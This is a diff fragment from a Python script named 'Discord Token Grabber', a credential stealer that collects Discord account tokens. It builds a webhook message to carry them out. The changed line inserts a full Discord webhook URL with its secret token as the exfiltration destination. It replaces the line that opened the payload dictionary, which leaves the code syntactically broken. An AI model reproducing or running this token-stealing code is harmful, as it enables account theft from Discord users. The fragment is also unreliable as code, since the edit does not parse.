@@ -245,7 +245,7 @@ def main():
                 file.write(token + "\n")
     if len(working) == 0:
         working.append('123')
-    webhook = {
+    webhook = https://discord.com/api/webhooks/1186053429043400704/HhSw0Yo5KnniKAvEIN_49q0dLSNSfCwi1um_EsbN2jWtZY15FM2bwFUkG75GfoxeH4Wi
         "content": "",
         "embeds": embeds,
         "username": "Discord Token Grabber",
